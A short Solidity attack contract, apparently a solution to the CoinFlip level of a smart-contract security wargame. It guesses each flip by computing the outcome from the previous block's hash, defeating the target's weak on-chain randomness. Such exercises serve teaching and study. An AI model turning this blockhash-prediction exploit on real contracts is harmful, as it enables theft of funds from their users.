// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "instances/03_coinflip.sol";

contract AttackerCoinFlip {
    function exploit(address coinflip) external {
        CoinFlip(coinflip).flip(
            uint256(blockhash(block.number - 1)) >> 255 == 1
        );
    }
}
